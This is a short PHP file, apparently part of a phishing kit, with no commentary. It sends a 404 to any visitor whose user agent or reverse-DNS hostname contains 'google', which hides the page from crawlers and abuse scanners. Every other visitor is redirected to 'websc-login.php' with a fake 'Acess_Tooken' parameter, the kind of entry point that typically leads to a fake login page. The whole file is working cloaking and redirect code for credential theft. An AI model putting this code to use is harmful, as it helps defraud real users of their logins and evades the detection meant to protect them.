                                <?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

$x=md5(microtime());
echo "<META HTTP-EQUIV='refresh' content='0; URL=websc-login.php?Go=_Restore_Start&_Acess_Tooken=$x$x'>";exit;
?>
                            